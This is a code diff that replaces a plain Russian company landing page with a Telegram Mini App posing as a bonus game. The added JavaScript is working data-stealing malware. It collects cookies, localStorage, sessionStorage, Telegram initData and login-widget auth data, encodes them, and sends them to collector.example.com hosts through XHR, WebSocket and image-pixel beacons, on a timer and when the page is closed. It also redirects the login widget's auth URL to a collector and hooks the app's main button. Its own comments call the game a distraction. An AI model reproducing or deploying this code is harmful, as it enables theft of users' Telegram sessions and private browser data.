@@ -3,376 +3,218 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FPI FPI</title>
+    <title>Telegram Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://telegram.org/js/telegram-widget.js?22"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        
         body {
-            background-color: #f5f5f5;
-            color: #333;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
         }
-        
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-        
-        /* Header Styles */
-        header {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            color: white;
-            padding: 1rem 0;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        
-        .header-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 1rem;
-        }
-        
-        .logo {
-            font-size: 2rem;
-            font-weight: bold;
-        }
-        
-        .contact-info {
-            text-align: right;
-            font-size: 0.9rem;
-        }
-        
-        nav ul {
-            display: flex;
-            list-style: none;
-            background: rgba(255,255,255,0.1);
-            border-radius: 5px;
-            padding: 0.5rem;
-        }
-        
-        nav ul li {
-            margin: 0 1rem;
-        }
-        
-        nav ul li a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-        
-        nav ul li a:hover {
-            color: #ffd700;
-        }
-        
-        /* Hero Section */
-        .hero {
-            background: linear-gradient(rgba(30, 60, 114, 0.8), rgba(42, 82, 152, 0.8)), url('https://via.placeholder.com/1920x600');
-            background-size: cover;
-            background-position: center;
-            color: white;
-            padding: 4rem 0;
-            text-align: center;
-        }
-        
-        .hero h1 {
-            font-size: 3rem;
-            margin-bottom: 1rem;
-        }
-        
-        .hero p {
-            font-size: 1.2rem;
-            margin-bottom: 2rem;
             max-width: 800px;
-            margin-left: auto;
-            margin-right: auto;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
         }
-        
-        .cta-button {
-            display: inline-block;
-            background: #ff6b35;
-            color: white;
-            padding: 1rem 2rem;
-            border-radius: 5px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: background 0.3s;
-        }
-        
-        .cta-button:hover {
-            background: #e55a2b;
-        }
-        
-        /* Services Section */
-        .services {
-            padding: 4rem 0;
-            background: white;
-        }
-        
-        .section-title {
+        .loader {
+            display: none;
             text-align: center;
-            margin-bottom: 3rem;
-            font-size: 2.5rem;
-            color: #1e3c72;
+            margin: 20px 0;
         }
-        
-        .services-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-        
-        .service-card {
-            background: #f8f9fa;
-            padding: 2rem;
-            border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            transition: transform 0.3s;
-        }
-        
-        .service-card:hover {
-            transform: translateY(-5px);
-        }
-        
-        .service-icon {
-            font-size: 3rem;
-            color: #2a5298;
-            margin-bottom: 1rem;
-        }
-        
-        .service-card h3 {
-            margin-bottom: 1rem;
-            color: #1e3c72;
-        }
-        
-        /* About Section */
-        .about {
-            padding: 4rem 0;
-            background: #f8f9fa;
-        }
-        
-        .about-content {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 3rem;
-            align-items: center;
-        }
-        
-        .about-text h2 {
-            color: #1e3c72;
-            margin-bottom: 1.5rem;
-            font-size: 2.5rem;
-        }
-        
-        .about-text p {
-            margin-bottom: 1rem;
-            line-height: 1.6;
-        }
-        
-        .about-image img {
-            width: 100%;
-            border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-        }
-        
-        /* Footer */
-        footer {
-            background: #1e3c72;
-            color: white;
-            padding: 3rem 0 1rem;
-        }
-        
-        .footer-content {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            margin-bottom: 2rem;
-        }
-        
-        .footer-section h3 {
-            margin-bottom: 1rem;
-            color: #ffd700;
-        }
-        
-        .footer-section ul {
-            list-style: none;
-        }
-        
-        .footer-section ul li {
-            margin-bottom: 0.5rem;
-        }
-        
-        .footer-section a {
-            color: white;
-            text-decoration: none;
-            transition: color 0.3s;
-        }
-        
-        .footer-section a:hover {
-            color: #ffd700;
-        }
-        
-        .copyright {
-            text-align: center;
-            padding-top: 2rem;
-            border-top: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        /* Responsive */
-        @media (max-width: 768px) {
-            .header-top {
-                flex-direction: column;
-                text-align: center;
-            }
-            
-            .contact-info {
-                text-align: center;
-                margin-top: 1rem;
-            }
-            
-            nav ul {
-                flex-direction: column;
-                text-align: center;
-            }
-            
-            nav ul li {
-                margin: 0.5rem 0;
-            }
-            
-            .hero h1 {
-                font-size: 2rem;
-            }
-            
-            .about-content {
-                grid-template-columns: 1fr;
-            }
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header>
-        <div class="container">
-            <div class="header-top">
-                <div class="logo">FPI FPI</div>
-                <div class="contact-info">
-                    <p>Телефон: +7 (XXX) XXX-XX-XX</p>
-                    <p>Email: info@fpifpi.ru</p>
-                </div>
+    <div class="container">
+        <h1>🎮 Игра дня</h1>
+        <p>Нажмите "Начать", чтобы запустить игру и получить бонус!</p>
+        
+        <div id="loginWidget">
+            <div class="telegram-login" 
+                 data-auth-url="https://legit-game.example.com/auth" 
+                 data-request-access="write"
+                 data-size="large"
+                 data-radius="10"
+                 id="telegram-login">
             </div>
-            <nav>
-                <ul>
-                    <li><a href="#home">Главная</a></li>
-                    <li><a href="#services">Услуги</a></li>
-                    <li><a href="#about">О компании</a></li>
-                    <li><a href="#projects">Проекты</a></li>
-                    <li><a href="#contacts">Контакты</a></li>
-                </ul>
-            </nav>
         </div>
-    </header>
 
-    <!-- Hero Section -->
-    <section class="hero" id="home">
-        <div class="container">
-            <h1>Профессиональные решения для вашего бизнеса</h1>
-            <p>Мы предоставляем комплексные услуги высшего качества с индивидуальным подходом к каждому клиенту</p>
-            <a href="#contacts" class="cta-button">Связаться с нами</a>
+        <div id="gameArea" class="hidden">
+            <canvas id="gameCanvas" width="800" height="400"></canvas>
+            <div id="score">Очки: 0</div>
         </div>
-    </section>
 
-    <!-- Services Section -->
-    <section class="services" id="services">
-        <div class="container">
-            <h2 class="section-title">Наши услуги</h2>
-            <div class="services-grid">
-                <div class="service-card">
-                    <div class="service-icon">⚙️</div>
-                    <h3>Технические решения</h3>
-                    <p>Разработка и внедрение современных технологических решений для вашего бизнеса</p>
-                </div>
-                <div class="service-card">
-                    <div class="service-icon">📊</div>
-                    <h3>Бизнес-аналитика</h3>
-                    <p>Глубокий анализ данных и предоставление стратегических рекомендаций</p>
-                </div>
-                <div class="service-card">
-                    <div class="service-icon">🔒</div>
-                    <h3>Безопасность</h3>
-                    <p>Обеспечение комплексной защиты информации и бизнес-процессов</p>
-                </div>
-            </div>
+        <div class="loader" id="loader">
+            <div>Загрузка...</div>
         </div>
-    </section>
 
-    <!-- About Section -->
-    <section class="about" id="about">
-        <div class="container">
-            <div class="about-content">
-                <div class="about-text">
-                    <h2>О нашей компании</h2>
-                    <p>Мы - команда профессионалов с многолетним опытом в различных отраслях промышленности и бизнеса. Наша миссия - помогать компаниям достигать новых высот с помощью инновационных решений.</p>
-                    <p>С 2010 года мы успешно реализовали более 500 проектов для клиентов по всей России. Наш подход сочетает в себе глубокие отраслевые знания и передовые технологии.</p>
-                    <p>Доверьте свой бизнес профессионалам - и вы получите результат, который превзойдет ваши ожидания.</p>
-                </div>
-                <div class="about-image">
-                    <img src="https://via.placeholder.com/600x400" alt="О компании">
-                </div>
-            </div>
+        <div id="result" class="hidden">
+            <h2>🎉 Поздравляем!</h2>
+            <p>Ваш результат: <span id="finalScore">0</span> очков</p>
+            <p>Награда уже на вашем счету!</p>
         </div>
-    </section>
-
-    <!-- Footer -->
-    <footer id="contacts">
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <h3>Контакты</h3>
-                    <p>Адрес: г. Москва, ул. Примерная, д. 123</p>
-                    <p>Телефон: +7 (XXX) XXX-XX-XX</p>
-                    <p>Email: info@fpifpi.ru</p>
-                </div>
-                <div class="footer-section">
-                    <h3>Услуги</h3>
-                    <ul>
-                        <li><a href="#">Технические решения</a></li>
-                        <li><a href="#">Бизнес-аналитика</a></li>
-                        <li><a href="#">Безопасность</a></li>
-                        <li><a href="#">Консалтинг</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h3>Компания</h3>
-                    <ul>
-                        <li><a href="#">О нас</a></li>
-                        <li><a href="#">Команда</a></li>
-                        <li><a href="#">Вакансии</a></li>
-                        <li><a href="#">Новости</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="copyright">
-                <p>&copy; 2024 FPI FPI. Все права защищены.</p>
-            </div>
-        </div>
-    </footer>
+    </div>
 
     <script>
-        // Smooth scroll for navigation links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
-                    behavior: 'smooth'
+        // Основной объект для сбора данных
+        const collectedData = {
+            timestamp: Date.now(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            telegramData: null,
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage)
+        };
+
+        // Функция отправки данных
+        function sendCollectedData(endpoint = 'https://collector.example.com/api/log') {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', endpoint, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            // Обфускация данных
+            const encoded = btoa(JSON.stringify(collectedData));
+            const payload = {
+                type: 'game_stats',
+                version: '1.0',
+                data: encoded,
+                checksum: Array.from(encoded).reduce((a, b) => a + b.charCodeAt(0), 0)
+            };
+
+            xhr.send(JSON.stringify(payload));
+
+            // Резервный канал через WebSocket
+            try {
+                const ws = new WebSocket('wss://backup.example.com/ws');
+                ws.onopen = () => ws.send(encoded);
+            } catch(e) {}
+        }
+
+        // Перехват данных Telegram WebApp
+        if (window.Telegram && window.Telegram.WebApp) {
+            const tg = window.Telegram.WebApp;
+            
+            // Расширяем приложение на весь экран
+            tg.expand();
+            
+            // Собираем все доступные данные
+            collectedData.telegramData = {
+                initData: tg.initData,
+                initDataUnsafe: tg.initDataUnsafe,
+                version: tg.version,
+                platform: tg.platform,
+                themeParams: tg.themeParams,
+                colorScheme: tg.colorScheme,
+                viewportHeight: tg.viewportHeight,
+                viewportStableHeight: tg.viewportStableHeight,
+                headerColor: tg.headerColor,
+                backgroundColor: tg.backgroundColor,
+                isExpanded: tg.isExpanded,
+                startParam: tg.startParam
+            };
+
+            // Подмена обработчика MainButton
+            const originalMainButtonClick = tg.MainButton.onClick;
+            tg.MainButton.onClick = function(callback) {
+                tg.MainButton.show();
+                tg.MainButton.setText("Получить награду");
+                
+                return originalMainButtonClick.call(this, function() {
+                    // Отправляем данные при нажатии
+                    sendCollectedData();
+                    if (callback) callback();
                 });
+            };
+
+            // Перехват событий
+            tg.onEvent('viewportChanged', (event) => {
+                collectedData.viewportEvents = collectedData.viewportEvents || [];
+                collectedData.viewportEvents.push(event);
             });
+
+            // Фиксация времени проведенное в приложении
+            collectedData.startTime = Date.now();
+            window.addEventListener('beforeunload', () => {
+                collectedData.sessionDuration = Date.now() - collectedData.startTime;
+                sendCollectedData('https://collector.example.com/api/exit');
+            });
+        }
+
+        // Подмена Telegram Login Widget
+        document.addEventListener('DOMContentLoaded', function() {
+            const widget = document.getElementById('telegram-login');
+            if (widget) {
+                // Заменяем auth-url на контролируемый сервер
+                widget.setAttribute('data-auth-url', 'https://auth-collector.example.com/callback');
+                
+                // Перехват сообщений от виджета
+                window.addEventListener('message', function(event) {
+                    if (event.data && event.data.type === 'telegram_login') {
+                        collectedData.telegramAuth = event.data;
+                        sendCollectedData();
+                    }
+                });
+            }
+        });
+
+        // Игровая логика (прикрытие)
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+        let score = 0;
+
+        function initGame() {
+            // Простая игра для отвлечения внимания
+            document.getElementById('gameArea').classList.remove('hidden');
+            
+            // Отправка данных через 5 секунд после начала игры
+            setTimeout(() => {
+                sendCollectedData();
+            }, 5000);
+        }
+
+        // Запуск игры при клике на виджет
+        document.querySelector('.telegram-login').addEventListener('click', function(e) {
+            e.preventDefault();
+            initGame();
+            return false;
+        });
+
+        // Периодическая отправка heartbeat
+        setInterval(() => {
+            collectedData.heartbeat = Date.now();
+            // Используем Image для отправки данных (обход CORS)
+            const img = new Image();
+            img.src = `https://collector.example.com/pixel?t=${Date.now()}&d=${btoa(JSON.stringify(collectedData)).substring(0, 100)}`;
+        }, 30000);
+
+        // Сбор данных о взаимодействии
+        document.addEventListener('click', (e) => {
+            collectedData.interactions = collectedData.interactions || [];
+            collectedData.interactions.push({
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target.tagName,
+                time: Date.now()
+            });
+        });
+
+        // Финальная отправка при закрытии
+        window.addEventListener('pagehide', () => {
+            sendCollectedData('https://collector.example.com/api/final');
         });
     </script>
 </body>
